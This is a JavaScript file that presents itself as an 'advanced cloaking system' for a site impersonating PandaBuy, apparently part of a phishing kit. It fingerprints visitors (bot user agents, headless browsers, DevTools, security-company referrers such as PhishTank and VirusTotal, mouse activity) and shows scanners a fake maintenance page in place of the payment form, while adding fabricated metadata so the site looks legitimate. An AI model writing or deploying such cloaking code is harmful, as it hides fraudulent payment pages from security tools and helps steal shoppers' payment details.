/**
 * Advanced cloaking system for PandaBuy
 * This script helps prevent detection by security services, bots, and scanning tools
 */

// Configuration
const config = {
    enabled: true,                   // Master switch for cloaking
    debug: false,                    // Log detailed debug info
    redirectUrl: "https://www.pandabuy.com/", // Where to redirect suspicious visitors
    showFakePage: true,              // Show fake content instead of redirecting
    checkReferrer: true,             // Check where visitor came from
    checkUserAgent: true,            // Check browser/crawler signatures
    checkMouseMovement: true,        // Check for natural user behavior
    checkDevTools: true,             // Detect developer tools
    ipBlocklist: [],                 // Optional IP ranges to block
    securityCompanies: [
        'google', 'cloudflare', 'akamai', 'imperva', 'sucuri', 'zscaler',
        'forcepoint', 'barracuda', 'cisco', 'juniper', 'paloalto', 'mcafee',
        'symantec', 'kaspersky', 'checkpoint', 'virustotal', 'phishtank'
    ]
};

// State
let state = {
    isBot: false,
    failedChecks: [],
    mouseMovements: 0,
    pageInteractions: 0,
    pageLoaded: Date.now(),
    isClean: null, // null = not determined yet, true = legitimate, false = suspicious
};

/**
 * Initialize the cloaking system
 */
function initCloaking() {
    if (!config.enabled) return;
    log('Initializing cloaking system...');
    
    // Check if we've already verified this visitor
    const storedVerification = sessionStorage.getItem('visitorVerified');
    if (storedVerification === 'true') {
        state.isClean = true;
        log('Visitor previously verified as legitimate');
        return;
    } else if (storedVerification === 'false') {
        state.isClean = false;
        log('Visitor previously identified as suspicious');
        handleSuspiciousVisitor();
        return;
    }
    
    // Run initial fast checks
    runInitialChecks();
    
    // If suspicious after initial checks, take action immediately
    if (state.isClean === false) {
        handleSuspiciousVisitor();
        return;
    }
    
    // Set up behavior monitoring
    if (config.checkMouseMovement) {
        document.addEventListener('mousemove', trackMouseMovement);
        document.addEventListener('click', trackInteraction);
        document.addEventListener('scroll', trackInteraction);
    }
    
    // Run secondary checks after a short delay
    setTimeout(runSecondaryChecks, 1500);
    
    // Add metadata to make site look legitimate
    addLegitimateMetadata();
}

/**
 * Run fast initial checks
 */
function runInitialChecks() {
    log('Running initial security checks...');
    
    // 1. Check user agent for bot signatures
    if (config.checkUserAgent && isBotUserAgent()) {
        state.failedChecks.push('user_agent');
        state.isBot = true;
    }
    
    // 2. Check referrer for security companies
    if (config.checkReferrer && isSecurityReferrer()) {
        state.failedChecks.push('referrer');
    }
    
    // 3. Check for headless browser characteristics
    if (hasHeadlessBrowserTraits()) {
        state.failedChecks.push('headless');
        state.isBot = true;
    }
    
    // 4. Check for suspicious URL parameters
    if (hasSuspiciousUrlParameters()) {
        state.failedChecks.push('url_parameters');
    }
    
    // Evaluate results of initial checks
    if (state.isBot || state.failedChecks.length >= 2) {
        log('Initial checks failed: ' + state.failedChecks.join(', '));
        state.isClean = false;
        sessionStorage.setItem('visitorVerified', 'false');
    } else if (state.failedChecks.length === 0) {
        log('Initial checks passed');
        state.isClean = true;
        sessionStorage.setItem('visitorVerified', 'true');
    }
}

/**
 * Run secondary checks after a delay
 */
function runSecondaryChecks() {
    // If already determined, don't run again
    if (state.isClean !== null) return;
    
    log('Running secondary checks...');
    
    // 1. Check for natural user behavior
    if (config.checkMouseMovement) {
        if (state.mouseMovements < 5 && state.pageInteractions < 2) {
            state.failedChecks.push('user_behavior');
        }
    }
    
    // 2. Check if DevTools is open
    if (config.checkDevTools && isDevToolsOpen()) {
        state.failedChecks.push('dev_tools');
    }
    
    // 3. Time on page check
    const timeOnPage = Date.now() - state.pageLoaded;
    if (timeOnPage < 1000) {
        state.failedChecks.push('time_on_page');
    }
    
    // Make final determination
    if (state.failedChecks.length >= 2) {
        log('Secondary checks failed: ' + state.failedChecks.join(', '));
        state.isClean = false;
        sessionStorage.setItem('visitorVerified', 'false');
        handleSuspiciousVisitor();
    } else {
        log('All checks passed');
        state.isClean = true;
        sessionStorage.setItem('visitorVerified', 'true');
    }
}

/**
 * Check if the user agent contains bot signatures
 */
function isBotUserAgent() {
    const ua = navigator.userAgent.toLowerCase();
    const botPatterns = [
        'googlebot', 'bingbot', 'yandex', 'baiduspider', 'twitterbot',
        'facebookexternalhit', 'linkedinbot', 'slackbot', 'telegrambot',
        'whatsapp', 'ahrefsbot', 'mj12bot', 'semrushbot', 'screaming',
        'crawler', 'spider', 'lighthouse', 'headless', 'chrome-lighthouse',
        'bot', 'crawl', 'scanner', 'scan', 'phantom', 'webdriver', 'selenium',
        'puppeteer', 'chromeframe', 'testing', 'winhttp', 'httrack'
    ];
    
    return botPatterns.some(pattern => ua.includes(pattern));
}

/**
 * Check if the referrer is from a security company
 */
function isSecurityReferrer() {
    if (!document.referrer) return false;
    
    const ref = document.referrer.toLowerCase();
    return config.securityCompanies.some(company => ref.includes(company));
}

/**
 * Check for headless browser characteristics
 */
function hasHeadlessBrowserTraits() {
    // Check navigator properties often missing in headless browsers
    if (!navigator.plugins || navigator.plugins.length === 0) return true;
    if (!navigator.languages || navigator.languages.length === 0) return true;
    
    // Check for webdriver attribute (common in automation tools)
    if (navigator.webdriver) return true;
    
    // Chrome headless detection
    if (/HeadlessChrome/.test(navigator.userAgent)) return true;
    
    return false;
}

/**
 * Check for suspicious URL parameters
 */
function hasSuspiciousUrlParameters() {
    const params = new URLSearchParams(window.location.search);
    const suspiciousParams = ['scan', 'check', 'test', 'security', 'bot', 'debug', 'verify', 'analysis'];
    
    for (const param of suspiciousParams) {
        if (params.has(param)) return true;
    }
    
    return false;
}

/**
 * Check if DevTools is open
 */
function isDevToolsOpen() {
    // Size method - may not work in all browsers but is a good approximation
    const widthThreshold = window.outerWidth - window.innerWidth > 160;
    const heightThreshold = window.outerHeight - window.innerHeight > 160;
    
    return widthThreshold || heightThreshold;
}

/**
 * Track mouse movements for bot detection
 */
function trackMouseMovement() {
    state.mouseMovements++;
}

/**
 * Track user interactions (clicks, scrolls)
 */
function trackInteraction() {
    state.pageInteractions++;
}

/**
 * Handle suspicious visitors
 */
function handleSuspiciousVisitor() {
    log('Handling suspicious visitor');
    
    if (config.showFakePage) {
        // Show clean version of the site without form functionality
        hideSensitiveContent();
    } else if (config.redirectUrl) {
        // Redirect to legitimate site
        window.location.href = config.redirectUrl;
    }
}

/**
 * Hide sensitive content from suspicious visitors
 */
function hideSensitiveContent() {
    // Replace payment form with fake content
    const paymentModal = document.getElementById('paymentModal');
    if (paymentModal) {
        const modalContent = paymentModal.querySelector('.modal-content');
        if (modalContent) {
            // Save original content
            if (!modalContent.dataset.originalContent) {
                modalContent.dataset.originalContent = modalContent.innerHTML;
            }
            
            // Show a maintenance message instead
            modalContent.innerHTML = `
                <span class="close">&times;</span>
                <div class="payment-header">
                    <img src="images/logo.png" alt="PandaBuy Logo" class="payment-logo">
                    <h2>Service Temporarily Unavailable</h2>
                    <p class="payment-header-text">We're performing scheduled maintenance. Please try again later.</p>
                </div>
                <div style="padding: 30px; text-align: center;">
                    <i class="fas fa-server" style="font-size: 48px; color: #4a6cf7; margin-bottom: 20px;"></i>
                    <p>Our payment verification system is currently undergoing scheduled maintenance.</p>
                    <p>Please check back later or contact customer support if you need immediate assistance.</p>
                    <a href="https://t.me/azzarro" target="_blank" style="display: inline-block; margin-top: 20px; padding: 10px 20px; background-color: #4a6cf7; color: white; text-decoration: none; border-radius: 4px;">
                        <i class="fab fa-telegram"></i> Contact Support
                    </a>
                </div>
            `;
        }
    }
    
    // Disable form submission
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.onsubmit = (e) => {
            e.preventDefault();
            alert('This service is temporarily unavailable due to scheduled maintenance. Please try again later.');
            return false;
        };
    });
}

/**
 * Add legitimate-looking metadata to the page
 */
function addLegitimateMetadata() {
    // Add SEO meta tags
    const metaTags = [
        { name: 'description', content: 'PandaBuy - Your trusted partner for global shipping and package forwarding services from China. Track shipments, manage parcels, and enjoy secure international delivery.' },
        { name: 'keywords', content: 'parcel forwarding, china shipping, international package delivery, pandabuy, logistics services, global shipping' },
        { name: 'robots', content: 'index, follow' },
        { property: 'og:title', content: 'PandaBuy - Global Shipping & Parcel Services' },
        { property: 'og:description', content: 'Trusted parcel forwarding and global shipping services from China. Manage your packages and track shipments with ease.' }
    ];
    
    metaTags.forEach(tag => {
        const meta = document.createElement('meta');
        if (tag.name) meta.name = tag.name;
        if (tag.property) meta.setAttribute('property', tag.property);
        meta.content = tag.content;
        document.head.appendChild(meta);
    });
    
    // Add Schema.org structured data
    const schema = {
        '@context': 'https://schema.org',
        '@type': 'Organization',
        'name': 'PandaBuy',
        'url': window.location.origin,
        'logo': window.location.origin + '/images/logo.png',
        'description': 'International shipping and parcel forwarding services specializing in deliveries from China to worldwide destinations.'
    };
    
    const scriptTag = document.createElement('script');
    scriptTag.type = 'application/ld+json';
    scriptTag.textContent = JSON.stringify(schema);
    document.head.appendChild(scriptTag);
}

/**
 * Check if a visitor is legitimate (for external use)
 */
function isLegitimateVisitor() {
    // If we've already determined, return the result
    if (state.isClean !== null) return state.isClean;
    
    // If not yet determined, do a quick check
    runInitialChecks();
    return state.isClean !== false; // Return true if not clearly suspicious
}

/**
 * Log message if debug is enabled
 */
function log(message) {
    if (config.debug) {
        console.log('[Cloaking] ' + message);
    }
}

// Export functions for external use
window.cloakingSystem = {
    init: initCloaking,
    isLegitimate: isLegitimateVisitor,
    config: config
};

// Initialize automatically when the script loads
document.addEventListener('DOMContentLoaded', initCloaking); 